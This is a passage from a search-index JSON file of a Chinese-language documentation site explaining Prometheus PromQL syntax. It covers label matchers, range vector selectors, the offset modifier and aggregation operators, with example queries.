quantile\u7528\u4e8e\u8ba1\u7b97\u5f53\u524d\u6837\u672c\u6570\u636e\u503c\u7684\u5206\u5e03\u60c5\u51b5quantile(\u03c6, express)\u5176\u4e2d0 \u2264 \u03c6 \u2264 1\u3002 \u4f8b\u5982\uff0c\u5f53\u03c6\u4e3a0.5\u65f6\uff0c\u5373\u8868\u793a\u627e\u5230\u5f53\u524d\u6837\u672c\u6570\u636e\u4e2d\u7684\u4e2d\u4f4d\u6570\uff1a quantile(0.5, http_requests_total)","title":"Prometheus\u76d1\u63a7\u67e5\u8be2\u8bed\u6cd5\u5165\u95e8"},{"location":"monitor/prometheus/query_rules/#_1","text":"metric\u4ecb\u7ecd\uff0cPrometheus\u672c\u8d28\u4e0a\u662f\u65f6\u5e8f\u6570\u636e\u5e93\uff0cPrometheus\u4f1a\u5c06\u6240\u6709\u91c7\u96c6\u5230\u7684\u6837\u672c\u6570\u636e\u4ee5\u65f6\u95f4\u5e8f\u5217\u7684\u65b9\u5f0f\u4fdd\u5b58\u5728\u5185\u5b58\u6570\u636e\u5e93\u4e2d\uff0c\u5e76\u4e14\u5b9a\u65f6\u4fdd\u5b58\u5230\u786c\u76d8\u4e0a \u6570\u636e\u7ed3\u6784\u5982\u4e0b\u56fe\uff1a \u5728Prometheus\u7684\u4e16\u754c\u91cc\u9762\uff0c\u6240\u6709\u7684\u6570\u503c\u90fd\u662f64 bit\u7684\u3002\u6bcf\u6761\u65f6\u95f4\u5e8f\u5217\u91cc\u9762\u8bb0\u5f55\u7684\u5c31\u662f64 bit Timestamp\uff08\u65f6\u95f4\u6233\uff09\u548c64 bit\u7684Sample Value\uff08\u91c7\u6837\u503c\uff09 \u5728prometheus\u6709\u4e24\u79cd\u67e5\u8be2\u65b9\u5f0f\uff0c\u67e5\u8be2\u4e00\u822c\u662f\u4e0d\u5e26\u65f6\u95f4\u7684\uff0c\u8be5\u4e24\u79cd\u65b9\u5f0f\u5982\u4e0b\uff0c \u67e5\u8be2\u4ec0\u4e48\u6570\u636e\uff0c\u53ea\u8981\u5199\u597dPromQL\uff0c\u5728Prometheus\u66b4\u9732\u76849090\u7aef\u53e3\u7684\u9875\u9762\u4e2d\u67e5\u8be2\u5373\u53ef\u3002 \u76f8\u5173\u8bed\u6cd5\uff1a","title":""},{"location":"monitor/prometheus/query_rules/#label","text":"\u5339\u914d\u5668\u662f\u4f5c\u7528\u4e8e\u6807\u7b7e\u4e0a\u7684\uff0c\u6807\u7b7e\u5339\u914d\u5668\u53ef\u4ee5\u5bf9\u65f6\u95f4\u5e8f\u5217\u8fdb\u884c\u8fc7\u6ee4\uff0cPrometheus\u652f\u6301\u5b8c\u5168\u5339\u914d\u548c\u6b63\u5219\u5339\u914d\u4e24\u79cd\u6a21\u5f0f\u3002","title":"label\u4e0a\u7684\u5339\u914d\u5668"},{"location":"monitor/prometheus/query_rules/#1","text":"\u76f8\u7b49\u5339\u914d\u5668\uff08Equality Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5b8c\u5168\u76f8\u540c\u7684\u6807\u7b7e\u3002\u4e0b\u9762\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\u5c31\u4f1a\u4f7f\u7528\u76f8\u7b49\u5339\u914d\u5668\u6309\u7167\u6761\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u8fc7\u6ee4\u3002 http_requests_total{job=\"HelloWorld\",status=\"200\",method=\"POST\",handler=\"/api/comments\"} \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6807\u7b7e\u4e3a\u7a7a\u6216\u8005\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u4f7f\u7528Label=\"\"\u7684\u5f62\u5f0f\u3002\u5bf9\u4e8e\u4e0d\u5b58\u5728\u7684\u6807\u7b7e\uff0c\u6bd4\u5982demo\u6807\u7b7e\uff0c\u56fe4-7\u6240\u793a\u7684go_gc_duration_seconds_count\u548c\u56fe4-8\u6240\u793a\u7684go_gc_duration_seconds_count{demo=\"\"}\u6548\u679c\u5176\u5b9e\u662f\u4e00\u6837\u7684\u3002","title":"1.\u76f8\u7b49\u5339\u914d\u5668\uff08=\uff09"},{"location":"monitor/prometheus/query_rules/#2","text":"\u4e0d\u76f8\u7b49\u5339\u914d\u5668\uff08Negative Equality Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u4e0d\u76f8\u540c\u7684\u6807\u7b7e\u3002\u5b83\u548c\u76f8\u7b49\u5339\u914d\u5668\u662f\u5b8c\u5168\u76f8\u53cd\u7684\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u60f3\u8981\u67e5\u770bjob\u5e76\u4e0d\u662fHelloWorld\u7684HTTP\u8bf7\u6c42\u603b\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u4e0d\u76f8\u7b49\u5339\u914d\u5668\u3002 http_requests_total{job!=\"HelloWorld\"}","title":"2.\u4e0d\u76f8\u7b49\u5339\u914d\u5668\uff08\uff01=\uff09"},{"location":"monitor/prometheus/query_rules/#3","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\uff08Regular Expression Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u8fd0\u7b97\u540e\u6240\u5f97\u7ed3\u679c\u76f8\u5339\u914d\u7684\u6807\u7b7e\u3002Prometheus\u7684\u6b63\u5219\u8fd0\u7b97\u662f\u5f3a\u6307\u5b9a\u7684\uff0c\u6bd4\u5982\u6b63\u5219\u8868\u8fbe\u5f0fa\u53ea\u4f1a\u5339\u914d\u5230\u5b57\u7b26\u4e32a\uff0c\u800c\u5e76\u4e0d\u4f1a\u5339\u914d\u5230ab\u6216\u8005ba\u6216\u8005abc\u3002\u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528\u8fd9\u6837\u7684\u5f3a\u6307\u5b9a\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u524d\u9762\u6216\u8005\u540e\u9762\u52a0\u4e0a\u201c. \u201d\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u8868\u793ajob\u662f\u6240\u6709\u4ee5Hello\u5f00\u5934\u7684HTTP\u8bf7\u6c42\u603b\u6570\u3002 http_requests_total{job=~\"Hello. \"} http_requests_total\u76f4\u63a5\u7b49\u6548\u4e8e{ name =\"http_requests_total\"}\uff0c\u540e\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u548c\u524d\u8005\u4e00\u6837\u76844\u79cd\u5339\u914d\u5668\uff08=\uff0c\uff01=\uff0c=~\uff0c\uff01~\uff09\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u6848\u4f8b\u53ef\u4ee5\u8868\u793a\u6240\u6709\u4ee5Hello\u5f00\u5934\u7684\u6307\u6807\u3002 { name =~\"Hello.*\"} \u5982\u679c\u60f3\u8981\u67e5\u770bjob\u662f\u4ee5Hello\u5f00\u5934\u7684\uff0c\u4e14\u5728\u751f\u4ea7\uff08prod\uff09\u3001\u6d4b\u8bd5\uff08test\uff09\u3001\u9884\u53d1\u5e03\uff08pre\uff09\u7b49\u73af\u5883\u4e0b\u54cd\u5e94\u7ed3\u679c\u4e0d\u662f200\u7684HTTP\u8bf7\u6c42\u603b\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u8fdb\u884c\u67e5\u8be2\u3002 http_requests_total{job=~\"Hello.*\",env=~\"prod|test|pre\",code!=\"200\"} \u7531\u4e8e\u6240\u6709\u7684PromQL\u8868\u8fbe\u5f0f\u5fc5\u987b\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u6307\u6807\u540d\u79f0\uff0c\u6216\u8005\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u4f1a\u5339\u914d\u5230\u7a7a\u5b57\u7b26\u4e32\u7684\u6807\u7b7e\u8fc7\u6ee4\u5668\uff0c\u56e0\u6b64\u7ed3\u5408Prometheus\u5b98\u65b9\u6587\u6863\uff0c\u53ef\u4ee5\u68b3\u7406\u51fa\u5982\u4e0b\u975e\u6cd5\u793a\u4f8b\u3002 {job=~\".*\"} # \u975e\u6cd5\uff01 {job=\"\"} # \u975e\u6cd5\uff01 {job!=\"\"} # \u975e\u6cd5\uff01 \u76f8\u53cd\uff0c\u5982\u4e0b\u8868\u8fbe\u5f0f\u662f\u5408\u6cd5\u7684\u3002 {job=~\".+\"} # \u5408\u6cd5\uff01.+\u8868\u793a\u81f3\u5c11\u4e00\u4e2a\u5b57\u7b26 {job=~\". \",method=\"get\"} # \u5408\u6cd5\uff01. \u8868\u793a\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 {job=\"\",method=\"post\"} # \u5408\u6cd5\uff01\u5b58\u5728\u4e00\u4e2a\u975e\u7a7a\u5339\u914d {job=~\".+\",method=\"post\"} # \u5408\u6cd5\uff01\u5b58\u5728\u4e00\u4e2a\u975e\u7a7a\u5339\u914d","title":"3.\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\uff08=~\uff09"},{"location":"monitor/prometheus/query_rules/#4","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u76f8\u53cd\u5339\u914d\u5668\uff08Negative Regular Expression Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u8fd0\u7b97\u540e\u6240\u5f97\u7ed3\u679c\u4e0d\u5339\u914d\u7684\u6807\u7b7e\u3002\u56e0\u4e3aPromQL\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u57fa\u4e8eRE2\u7684\u8bed\u6cd5\uff0c\u4f46\u662fRE2\u4e0d\u652f\u6301\u5411\u524d\u4e0d\u5339\u914d\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\uff01~\u7684\u51fa\u73b0\u662f\u4f5c\u4e3a\u4e00\u79cd\u66ff\u4ee3\u65b9\u6848\uff0c\u4ee5\u5b9e\u73b0\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u6392\u9664\u6307\u5b9a\u6807\u7b7e\u503c\u7684\u529f\u80fd\u3002\u5728\u4e00\u4e2a\u9009\u62e9\u5668\u5f53\u4e2d\uff0c\u53ef\u4ee5\u9488\u5bf9\u540c\u4e00\u4e2a\u6807\u7b7e\u6765\u4f7f\u7528\u591a\u4e2a\u5339\u914d\u5668\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u5b9e\u73b0\u67e5\u627ejob\u540d\u662fnode\u4e14\u5b89\u88c5\u5728/prometheus\u76ee\u5f55\u4e0b\uff0c\u4f46\u662f\u5e76\u4e0d\u5728/prometheus/user\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\u5e76\u786e\u5b9a\u5176\u5927\u5c0f\u3002 node_filesystem_size_bytes{job=\"node\",mountpoint=~\"/prometheus/. \", mountpoint!~ \"/prometheus/user/. \"} PromQL\u91c7\u7528\u7684\u662fRE2[1]\u5f15\u64ce\uff0c\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u3002RE2\u6765\u6e90\u4e8eGo\u8bed\u8a00\uff0c\u5b83\u88ab\u8bbe\u8ba1\u4e3a\u4e00\u79cd\u7ebf\u6027\u65f6\u95f4\u7684\u6a21\u5f0f\uff0c\u975e\u5e38\u9002\u5408\u7528\u4e8ePromQL\u8fd9\u79cd\u65f6\u95f4\u5e8f\u5217\u7684\u65b9\u5f0f\u3002\u4f46\u662f\u5c31\u50cf\u6211\u4eec\u524d\u6587\u63cf\u8ff0\u7684RE2\u90a3\u6837\uff0c\u5176\u4e0d\u652f\u6301\u5411\u524d\u4e0d\u5339\u914d\u8868\u8fbe\u5f0f\uff08\u5411\u524d\u65ad\u8a00\uff09\uff0c\u4e5f\u4e0d\u652f\u6301\u53cd\u5411\u5f15\u7528\uff0c\u540c\u65f6\u8fd8\u7f3a\u5931\u5f88\u591a\u9ad8\u7ea7\u7279\u6027\u3002 \u601d\u8003\u62d3\u5c55 =\u3001\uff01=\u3001=~\u3001\uff01~\u8fd94\u4e2a\u5339\u914d\u5668\u5728\u5b9e\u6218\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u4f46\u662f\u5982\u679c\u9891\u7e41\u4e3a\u6807\u7b7e\u65bd\u52a0\u6b63\u5219\u5339\u914d\u5668\uff0c\u6bd4\u5982HTTP\u72b6\u6001\u7801\u67091xx\u30012xx\u30013xx\u30014xx\u30015xx\uff0c\u5728\u7edf\u8ba1\u6240\u6709\u8fd4\u56de\u503c\u662f5xx\u7684HTTP\u8bf7\u6c42\u65f6\uff0cPromQL\u8bed\u53e5\u5c31\u4f1a\u53d8\u6210http_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"500\"\uff0cstatus=~\"501\"\uff0cstatus=~\"502\"\uff0cstatus=~\"503\"\uff0cstatus=~\"504\"\uff0cstatus=~\"505\"\uff0cstatus=~\"506\"\u2026} \u4f46\u662f\uff0c\u6211\u4eec\u90fd\u77e5\u90535xx\u4ee3\u8868\u670d\u52a1\u5668\u9519\u8bef\uff0c\u8fd9\u4e9b\u72b6\u6001\u4ee3\u7801\u8868\u793a\u670d\u52a1\u5668\u5728\u5c1d\u8bd5\u5904\u7406\u8bf7\u6c42\u65f6\u53d1\u751f\u4e86\u5185\u90e8\u9519\u8bef\u3002\u8fd9\u4e9b\u9519\u8bef\u53ef\u80fd\u6765\u81ea\u670d\u52a1\u5668\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u8bf7\u6c42\u3002 1\uff09500\uff1a\u670d\u52a1\u5668\u9047\u5230\u9519\u8bef\uff0c\u65e0\u6cd5\u5b8c\u6210\u8bf7\u6c42\uff08\u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef\uff09\u3002 2\uff09501\uff1a\u670d\u52a1\u5668\u4e0d\u5177\u5907\u5b8c\u6210\u8bf7\u6c42\u7684\u529f\u80fd\u3002\u4f8b\u5982\uff0c\u5f53\u670d\u52a1\u5668\u65e0\u6cd5\u8bc6\u522b\u8bf7\u6c42\u65b9\u6cd5\u65f6\u53ef\u80fd\u4f1a\u8fd4\u56de\u6b64\u4ee3\u7801\uff08\u5c1a\u672a\u5b9e\u65bd\uff09\u3002 3\uff09502\uff1a\u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u65e0\u6548\u54cd\u5e94\uff08\u9519\u8bef\u7f51\u5173\uff09\u3002 4\uff09503\uff1a\u670d\u52a1\u5668\u76ee\u524d\u65e0\u6cd5\u4f7f\u7528\uff08\u7531\u4e8e\u8d85\u8f7d\u6216\u505c\u673a\u7ef4\u62a4\uff09\uff0c\u901a\u5e38\u53ea\u662f\u6682\u65f6\u72b6\u6001\uff08\u670d\u52a1\u4e0d\u53ef\u7528\uff09\u3002 5\uff09504\uff1a\u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4f46\u662f\u6ca1\u6709\u53ca\u65f6\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\uff08\u7f51\u5173\u8d85\u65f6\uff09\u3002 6\uff09505\uff1a\u670d\u52a1\u5668\u4e0d\u652f\u6301\u8bf7\u6c42\u4e2d\u6240\u7528\u7684HTTP\u534f\u8bae\u7248\u672c\uff08HTTP\u7248\u672c\u4e0d\u53d7\u652f\u6301\uff09\u3002 7\uff09506\uff1a\u7531\u300a\u900f\u660e\u5185\u5bb9\u534f\u5546\u534f\u8bae\u300b\uff08RFC 2295\uff09\u6269\u5c55\u800c\u6765\uff0c\u4ee3\u8868\u670d\u52a1\u5668\u5b58\u5728\u5185\u90e8\u914d\u7f6e\u9519\u8bef\u3002 8\uff09507\uff1a\u670d\u52a1\u5668\u65e0\u6cd5\u5b58\u50a8\u5b8c\u6210\u8bf7\u6c42\u6240\u5fc5\u9700\u7684\u5185\u5bb9\u3002\u8fd9\u4e2a\u72b6\u51b5\u88ab\u8ba4\u4e3a\u662f\u4e34\u65f6\u7684\u3002 9\uff09509\uff1a\u670d\u52a1\u5668\u8fbe\u5230\u5e26\u5bbd\u9650\u5236\u3002\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5b98\u65b9\u7684\u72b6\u6001\u7801\uff0c\u4f46\u662f\u4ecd\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002 10\uff09510\uff1a\u83b7\u53d6\u8d44\u6e90\u6240\u9700\u8981\u7684\u7b56\u7565\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u3002 \u4e3a\u4e86\u6d88\u9664\u8fd9\u6837\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u4f18\u5316\u3002 \u4f18\u5316\u4e00\u3000\u591a\u4e2a\u8868\u8fbe\u5f0f\u4e4b\u95f4\u4f7f\u7528\u201c|\u201d\u8fdb\u884c\u5206\u5272\uff1ahttp_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"500|501|502|503|504|505|506|507|509|510\"}\u3002 \u4f18\u5316\u4e8c\u3000\u5c06\u8fd9\u4e9b\u8fd4\u56de\u503c\u5305\u88c5\u4e3a5xx\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\u5bf9http_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"5xx\"}\u8fdb\u884c\u4f18\u5316\u3002 \u4f18\u5316\u4e09\u3000\u5982\u679c\u8981\u9009\u62e9\u4e0d\u4ee54xx\u5f00\u5934\u7684\u6240\u6709HTTP\u72b6\u6001\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528http_requests_total{status\uff01~\"4..\"}\u3002","title":"4.\u6b63\u5219\u8868\u8fbe\u5f0f\u76f8\u53cd\u5339\u914d\u5668\uff08\uff01~\uff09"},{"location":"monitor/prometheus/query_rules/#_2","text":"\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u8fd4\u56de\u4e00\u7ec4\u65f6\u95f4\u5e8f\u5217\uff0c\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u5305\u542b\u4e00\u6bb5\u65f6\u95f4\u8303\u56f4\u5185\u7684\u6837\u672c\u6570\u636e\u3002\u548c\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4ece\u5f53\u524d\u65f6\u95f4\u5411\u524d\u9009\u62e9\u4e86\u4e00\u5b9a\u65f6\u95f4\u8303\u56f4\u7684\u6837\u672c\u3002\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u4e3b\u8981\u5728\u9009\u62e9\u5668\u672b\u5c3e\u7684\u65b9\u62ec\u53f7[]\u4e2d\uff0c\u901a\u8fc7\u65f6\u95f4\u8303\u56f4\u9009\u62e9\u5668\u8fdb\u884c\u5b9a\u4e49\uff0c\u4ee5\u6307\u5b9a\u6bcf\u4e2a\u8fd4\u56de\u7684\u533a\u95f4\u5411\u91cf\u6837\u672c\u503c\u4e2d\u63d0\u53d6\u591a\u957f\u7684\u65f6\u95f4\u8303\u56f4\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u8868\u793a\u6700\u8fd15\u5206\u949f\u5185\u7684\u6240\u6709HTTP\u8bf7\u6c42\u7684\u6837\u672c\u6570\u636e\uff0c\u5176\u4e2d[5m]\u5c06\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u8f6c\u53d8\u4e3a\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u3002 http_request_total{}[5m] \u65f6\u95f4\u8303\u56f4\u901a\u8fc7\u6574\u6570\u6765\u8868\u793a\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5355\u4f4d\u4e4b\u4e00\uff1a\u79d2\uff08s\uff09\u3001\u5206\u949f\uff08m\uff09\u3001\u5c0f\u65f6\uff08h\uff09\u3001\u5929\uff08d\uff09\u3001\u5468\uff08w\uff09\u3001\u5e74\uff08y\uff09\u3002\u9700\u8981\u5f3a\u8c03\u7684\u662f\uff0c\u5fc5\u987b\u7528\u6574\u6570\u6765\u8868\u793a\u65f6\u95f4\uff0c\u6bd4\u598238 m\u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f2 h 15 m\u548c1.5 h\u90fd\u662f\u9519\u8bef\u7684\u3002\u8fd9\u91cc\u7684y\u662f\u5ffd\u7565\u95f0\u5e74\u7684\uff0c\u6c38\u8fdc\u662f60\u00d760\u00d724\u00d7365\u79d2\u3002 \u6848\u4f8b\u4e00\uff1a\u8ba1\u7b972\u5206\u949f\u5185\u7cfb\u7edf\u8fdb\u7a0b\u7684CPU\u4f7f\u7528\u7387\u3002 rate(node_cpu[2m]) \u6848\u4f8b\u4e8c\uff1a\u8ba1\u7b97\u7cfb\u7edfCPU\u7684\u603b\u4f53\u4f7f\u7528\u7387\uff0c\u901a\u8fc7\u6392\u9664\u7cfb\u7edf\u95f2\u7f6e\u7684CPU\u4f7f\u7528\u7387\u5373\u53ef\u83b7\u5f97\u3002 1 - avg without(cpu) (rate(node_cpu{mode=\"idle\"}[2m])) \u6848\u4f8b\u4e09\uff1anode_cpu_seconds_total\u53ef\u4ee5\u83b7\u53d6\u5f53\u524dCPU\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f7f\u7528avg\u805a\u5408\u67e5\u8be2\u5230\u6570\u636e\u540e\uff0c\u518d\u4f7f\u7528by\u6765\u533a\u5206\u5b9e\u4f8b\uff0c\u8fd9\u6837\u5c31\u80fd\u505a\u5230\u5206\u5b9e\u4f8b\u67e5\u8be2\u5404\u81ea\u7684\u6570\u636e\u3002 avg(irate(node_cpu_seconds_total{job=\"node_srv\"}[5m])) by (instance) \u5b9e\u6218\u62d3\u5c55 1\uff09\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u5f80\u5f80\u548c\u901f\u7387\u51fd\u6570rate\u4e00\u8d77\u4f7f\u7528\u3002\u6bd4\u5982\u5b50\u67e5\u8be2\uff0c\u4ee51\u6b21/\u5206\u949f\u7684\u901f\u7387\u91c7\u96c6\u5173\u4e8ehttp_requests_total\u6307\u6807\u5728\u8fc7\u53bb30\u5206\u949f\u5185\u7684\u6570\u636e\uff0c\u7136\u540e\u8fd4\u56de\u8fd930\u5206\u949f\u5185\u8ddd\u79bb\u5f53\u524d\u65f6\u95f4\u6700\u8fd1\u76845\u5206\u949f\u5185\u7684\u91c7\u96c6\u7ed3\u679c\uff0c\u5982\u4e0b\u6240\u793a\u3002 rate(http_requests_total[5m])[30m:1m] \u6ce8\u610f\uff0c\u4f7f\u7528\u4e0d\u5fc5\u8981\u7684\u5b50\u67e5\u8be2\u6216\u8005\u4e0d\u505c\u5730\u5d4c\u5957\u5b50\u67e5\u8be2\u5e76\u4e0d\u662f\u597d\u7684PromQL\u98ce\u683c\u3002 2\uff09\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\u8868\u8fbe\u5f0f\u4e0d\u80fd\u76f4\u63a5\u5c55\u793a\u5728Graph\u4e2d\uff0c\u4f46\u662f\u53ef\u4ee5\u5c55\u793a\u5728Console\u89c6\u56fe\u4e2d\u3002","title":"\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668"},{"location":"monitor/prometheus/query_rules/#_3","text":"\u504f\u79fb\u91cf\u4fee\u6539\u5668\u53ef\u4ee5\u8ba9\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u548c\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u53d1\u751f\u504f\u79fb\uff0c\u5b83\u5141\u8bb8\u83b7\u53d6\u67e5\u8be2\u8ba1\u7b97\u65f6\u95f4\u5e76\u5728\u6bcf\u4e2a\u9009\u62e9\u5668\u7684\u57fa\u7840\u4e0a\u5c06\u5176\u5411\u524d\u63a8\u79fb\u3002 \u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u548c\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u90fd\u53ef\u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u57fa\u51c6\u4e0b\u7684\u6837\u672c\u6570\u636e\uff0c\u5982\u679c\u6211\u4eec\u8981\u83b7\u53d6\u67e5\u8be2\u8ba1\u7b97\u65f6\u95f4\u524d5\u5206\u949f\u7684HTTP\u8bf7\u6c42\u60c5\u51b5\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u8fd9\u6837\u7684\u65b9\u5f0f\u3002 http_request_total{} offset 5m \u504f\u79fb\u5411\u91cf\u4fee\u6539\u5668\u7684\u5173\u952e\u5b57\u5fc5\u987b\u7d27\u8ddf\u5728\u9009\u62e9\u5668{}\u540e\u9762\uff0c\u5982\u4e0b\u7684\u8868\u8fbe\u5f0f\u5206\u522b\u662f\u6b63\u786e\u548c\u9519\u8bef\u7684\u793a\u4f8b\u3002 sum(http_requests_total{method=\"GET\"} offset 5m) // \u6b63\u786e sum(http_requests_total{method=\"GET\"}) offset 5m // \u975e\u6cd5 \u8be5\u64cd\u4f5c\u540c\u6837\u9002\u7528\u4e8e\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\uff0c\u6bd4\u5982\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u5176\u4ee5\u6307\u6807http_requests_total 5\u5206\u949f\u524d\u7684\u65f6\u95f4\u70b9\u4e3a\u8d77\u59cb\u9ad8\uff0c\u8fd4\u56de5\u5206\u949f\u4e4b\u5185\u7684HTTP\u8bf7\u6c42\u91cf\u7684\u589e\u957f\u901f\u7387\u3002 rate(http_requests_total[5m] offset 5m) \u504f\u79fb\u5411\u91cf\u4fee\u6539\u5668\u901a\u8fc7\u8c03\u6574\u8ba1\u7b97\u65f6\u95f4\u4e00\u6837\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u5386\u53f2\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u4e00\u822c\u53ea\u5bf9\u8c03\u8bd5\u5355\u6761\u8bed\u53e5\u7684\u5386\u53f2\u6570\u636e\u6709\u5e2e\u52a9\u3002\u968f\u7740\u65b0\u6570\u636e\u7684\u5230\u6765\uff0c\u5386\u53f2\u6570\u636e\u4e5f\u4f1a\u4e0d\u65ad\u53d1\u751f\u53d8\u5316\uff0c\u6240\u4ee5\u5efa\u8bae\u5728Grafana\u4e2d\u76f4\u63a5\u770b\u5386\u53f2\u6570\u636e\u7684\u53d8\u5316\u8d8b\u52bf\u3002 Prometheus\u67094\u5927\u6307\u6807\u7c7b\u578b\uff08Metrics Type\uff09\uff0c\u5206\u522b\u662fCounter\uff08\u8ba1\u6570\u5668\uff09\u3001Gauge\uff08\u4eea\u8868\u76d8\uff09\u3001Histogram\uff08\u76f4\u65b9\u56fe\uff09\u548cSummary\uff08\u6458\u8981\uff09\u3002\u8fd9\u662f\u5728Prometheus\u5ba2\u6237\u7aef\uff08\u76ee\u524d\u4e3b\u8981\u6709Go\u3001Java\u3001Python\u3001Ruby\u7b49\u8bed\u8a00\u7248\u672c\uff09\u4e2d\u63d0\u4f9b\u76844\u79cd\u6838\u5fc3\u6307\u6807\u7c7b\u578b\uff0c\u4f46\u662fPrometheus\u7684\u670d\u52a1\u7aef\u5e76\u4e0d\u533a\u5206\u6307\u6807\u7c7b\u578b\uff0c\u800c\u662f\u7b80\u5355\u5730\u628a\u8fd9\u4e9b\u6307\u6807\u7edf\u4e00\u89c6\u4e3a\u65e0\u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u3002\u672a\u6765\uff0cPrometheus\u5b98\u65b9\u5e94\u8be5\u4f1a\u505a\u51fa\u6539\u53d8","title":"\u504f\u79fb\u91cf\u4fee\u6539\u5668"},{"location":"monitor/prometheus/query_rules/#_4","text":"Prometheus\u8fd8\u63d0\u4f9b\u4e86\u4e0b\u5217\u5185\u7f6e\u7684\u805a\u5408\u64cd\u4f5c\u7b26\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u7b26\u4f5c\u7528\u57df\u77ac\u65f6\u5411\u91cf\u3002\u53ef\u4ee5\u5c06\u77ac\u65f6\u8868\u8fbe\u5f0f\u8fd4\u56de\u7684\u6837\u672c\u6570\u636e\u8fdb\u884c\u805a\u5408\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u65f6\u95f4\u5e8f\u5217\u3002 sum (\u6c42\u548c) min (\u6700\u5c0f\u503c) max (\u6700\u5927\u503c) avg (\u5e73\u5747\u503c) stddev (\u6807\u51c6\u5dee) stdvar (\u6807\u51c6\u65b9\u5dee) count (\u8ba1\u6570) count_values (\u5bf9value\u8fdb\u884c\u8ba1\u6570) bottomk (\u540en\u6761\u65f6\u5e8f) topk (\u524dn\u6761\u65f6\u5e8f) quantile (\u5206\u4f4d\u6570) \u4f7f\u7528\u805a\u5408\u64cd\u4f5c\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a <aggr-op>([parameter,] <vector expression>) [without|by (<label list>)] \u5176\u4e2d\u53ea\u6709 count_values , quantile , topk , bottomk 